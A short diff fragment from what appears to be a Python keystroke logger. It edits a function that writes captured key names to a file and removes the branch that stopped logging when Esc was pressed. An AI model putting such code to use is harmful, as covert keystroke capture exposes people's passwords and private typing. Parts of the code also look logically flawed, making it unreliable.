@@ -41,10 +41,7 @@ def write_file(qelesat):
 				
 			elif k.find('caps_lock') > 0:
 				file.write(' Caps_lock ')
-				
-			elif k.find('esc') > 0:
-				return False
-			
+
 			elif k.find('qeles'):
 				file.write(k)
 				
